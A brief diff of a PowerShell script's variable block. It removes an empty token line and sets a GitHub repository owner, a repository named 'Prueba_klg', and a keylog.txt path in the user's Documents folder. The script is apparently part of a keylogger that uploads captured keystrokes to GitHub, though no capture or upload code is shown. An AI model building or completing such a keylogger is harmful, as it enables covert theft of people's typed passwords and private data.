@@ -1,6 +1,5 @@
 
 # Variables
-$token="";
 $repoOwner = "SAHIBADAS"  # Reemplaza con tu nombre de usuario o la organización del repositorio
 $repoName = "Prueba_klg"  # Reemplaza con el nombre de tu repositorio
 $filePath = "$env:USERPROFILE\Documentos\keylog.txt"
